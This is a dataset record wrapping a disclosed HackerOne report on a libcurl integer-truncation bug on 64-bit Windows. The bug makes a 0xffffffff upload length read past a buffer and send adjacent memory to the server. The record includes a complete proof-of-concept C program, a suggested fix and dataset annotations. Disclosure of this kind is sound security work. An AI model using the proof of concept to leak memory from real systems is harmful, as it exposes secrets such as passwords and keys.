{
  "reported_to": "curl",
  "reported_by": "nsq11 ",
  "title": " Remote memory disclosure vulnerability in libcurl on 64 Bit Windows",
  "content": "\nRemote memory disclosure vulnerability in libcurl on 64 Bit Windows\nSummary:\nlibcurl (latest) contains a vulnerability that enables attackers to\nremotely read memory beyond the bounds of a buffer in the style of the\ninfamous \"heartbleed\" vulnerability. Luckily, however, this is only\npossible when libcurl runs on 64 bit Windows and it requires an\nattacker capable of influencing the size of a file upload part.\nThe core of the problem is the following: while on 64 Linux and BSD\nsystems, sizeof(long) is 8, on 64 bit Windows, it\nis 4. Consequently, the function AddHttpPost carries out an integer\ntruncation and sign conversion on these systems, as the parameter\nbufferlength of type size_t (8 byte wide, unsigned) is assigned to\nthe field post->bufferlength of type long (4 byte wide,\nsigned). The following excerpt shows the corresponding code:\nCode 334 Bytes\n1static struct curl_httppost *\n2AddHttpPost(char *name, size_t namelength,\n3            char *value, curl_off_t contentslength,\n4            char *buffer, size_t bufferlength,\n5\t        [...]\n6            struct curl_httppost **last_post)\n7{\n8\t[...]\n9    post->buffer = buffer;\n10    post->bufferlength = (long)bufferlength; /* <=== */ \n11\t[...]\n12}\nIn particular, this function is triggered when constructing an HTTP\nPOST request that specifies custom file upload parts, e.g., with a\nstatement such as the following:\nCode 235 Bytes\n1curl_formadd(&formpost,\n2             &lastptr,\n3             CURLFORM_COPYNAME, \"name\",\n4             CURLFORM_BUFFER, \"data\",\n5             CURLFORM_BUFFERPTR, buffer,\n6             CURLFORM_BUFFERLENGTH, size,\n7             CURLFORM_END);\nAn attacker capable of choosing the file to upload may choose for it\nto be 4294967295 in size, and, indeed, libcurl will transfer this\nfile without trouble on 64 bit Linux. On 64 bit Windows, however, this\nleads to post->bufferlength being -1 due to the\ntruncation/sign-conversion, which happens to also be the value of the\nconstant CURL_ZERO_TERMINATED. On posting the data, this undesirable\ninterpretation causes the function curl_mime_data to assume that the\nlength of the buffer to upload is not known and should be determined\nvia strlen. Assuming the buffer does not contain zero bytes - and in\nfact, the documentation states that it MAY NOT contain zero bytes,\nstrlen will read beyond the bounds of the buffer buffer, and\nsubsequently transmit the buffer contents AND memory behind it to the\nHTTP server.\nThe following (commented) excerpt of curl_mime_data illustrates this\nbehavior:\nCode 644 Bytes\n1CURLcode curl_mime_data(curl_mimepart *part, /* <=== */ \n2                        const char *data, size_t datasize)\n3{\n4   [...]\n5\n6  if(data) {\n7    // This branch is triggered when `datasize` is -1,\n8\t// Note that `datasize` is again `size_t`, so, it will\n9\t// then be > 2**32-1.\n10    if(datasize == CURL_ZERO_TERMINATED)\n11      datasize = strlen(data);\n12\n13\t// With a system that has > 4GB RAM, this allocation\n14\t// succeeds.\n15    part->data = malloc(datasize + 1);\n16    if(!part->data)\n17      return CURLE_OUT_OF_MEMORY;\n18\n19\t// The part size is now set to be larger than 2**32-1,\n20\t// although 2**32-1 is the size of the file. \n21    part->datasize = datasize;\n22\nSteps To Reproduce:\nTo further illustrate the problem, I have created a sample application\nfor which the string \"secret\" is located directly after the\nto-be-transmitted buffer. On 64 bit Linux, the program correctly\ntransmits only the contents of the buffer. On 64 bit Windows, it\ntransmits the buffer contents and the string \"secret\". Logging network\ntraffic using tcpdump, this has been confirmed as the attached\nscreenshots show.\nThe following is the sample program (test.c), which compiles both on Linux\nand Windows (Visual Studio 2022 Community Edition).\nCode 2.18 KiB\n1#include <stdio.h>\n2#include <string.h>\n3#include <stdlib.h>\n4#include <curl/curl.h>\n5\n6int main(void)\n7{\n8    CURL* curl;\n9    CURLM* multi_handle;\n10    int still_running = 0;\n11    struct curl_httppost* formpost = NULL;\n12    struct curl_httppost* lastptr = NULL;\n13    struct curl_slist* headerlist = NULL;\n14    static const char buf[] = \"Expect:\";\n15\n16    // Place 4294967295 'A's on the heap (the buffer to transmit),\n17    // followed by the string \"secret\". If we now instruct libcurl\n18    // to transfer 4294967295, it should only transfer 'A's.\n19    \n20    size_t size = (size_t) 0xffffffff;\n21    char* buffer = (char*)malloc(size + strlen(\"secret\") + 1);    \n22    memset(buffer, 'A', size);    \n23    memcpy(buffer + size, \"secret\", strlen(\"secret\"));\n24    buffer[size + strlen(\"secret\")] = '\\0';\n25\n26    // Instruct curl to send the buffer, specifying its size\n27    // to be 4294967295 (size)\n28    \n29    int ret = curl_formadd(&formpost,\n30        &lastptr,\n31        CURLFORM_COPYNAME, \"name\",\n32        CURLFORM_BUFFER, \"data\",\n33        CURLFORM_BUFFERPTR, buffer,\n34        CURLFORM_BUFFERLENGTH, size,\n35        CURLFORM_END);\n36\n37    // The return value is 0 (success)\n38    printf(\"%d\\n\", ret);\n39    \n40    curl = curl_easy_init();\n41    multi_handle = curl_multi_init();    \n42    headerlist = curl_slist_append(headerlist, buf);\n43    if (curl && multi_handle) {\n44      // We are uploading to a local webserver, but this can be any webserver.\n45      // upload.cgi can be an empty file.\n46      curl_easy_setopt(curl, CURLOPT_URL, \"http://192.168.1.216/upload.cgi\");\n47      curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);\n48      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);\n49      curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);      \n50      curl_multi_add_handle(multi_handle, curl);      \n51      do {\n52            CURLMcode mc = curl_multi_perform(multi_handle, &still_running);\t    \n53            if (still_running)\n54\t      /* wait for activity, timeout or \"nothing\" */\n55\t      mc = curl_multi_poll(multi_handle, NULL, 0, 1000, NULL);\t    \n56            if (mc)\n57\t      break;\t    \n58      } while (still_running);      \n59      curl_multi_cleanup(multi_handle);\n60      curl_easy_cleanup(curl);\n61      curl_formfree(formpost);\n62      curl_slist_free_all(headerlist);\n63    }\n64    return 0;\n65}\nAs suggested patch would be to use the type long long as opposed to\nlong for the buffer length. long long is guaranteed to be 8 byte\nwide on Linux and Windows 64 bit systems.\nImpact\nAn attacker could read memory from the process remotely, meaning that any information processed by the program using libcurl may be disclosed. Depending on the application, this information may be sensitive, e.g., passwords, keys could be in memory. In addition, reading memory offsets may be useful to identify memory mappings remotely in preparation for a memory corruption exploits that requires bypassing of ASLR.\n\n",
  "severity": [
    7.7,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Information Exposure Through Sent Data"
  ],
  "screenshots": {},
  "disclosed_date": 1645452900,
  "report_url": "https://hackerone.com/reports/1444539",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a buffer of size 4294967295 bytes (0xffffffff) followed by a secret string in memory."
    ],
    [
      2,
      "Use libcurl's curl_formadd with CURLFORM_BUFFERLENGTH set to 4294967295 to trigger the memory disclosure on 64-bit Windows."
    ]
  ],
  "vuln_description": "A remote memory disclosure vulnerability in libcurl on 64-bit Windows systems allows an attacker to read memory beyond the bounds of a buffer during file uploads. This occurs due to integer truncation and sign conversion when assigning a size_t (8-byte) value to a long (4-byte) field, causing the system to misinterpret the buffer length and read adjacent memory.",
  "reason": "The vulnerability requires understanding of platform-specific type sizes (size_t vs long), memory allocation behaviors, and libcurl's internal handling of buffer lengths. The interaction between these components is subtle and non-obvious, particularly the sign conversion aspect that leads to the -1/CURL_ZERO_TERMINATED misinterpretation.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}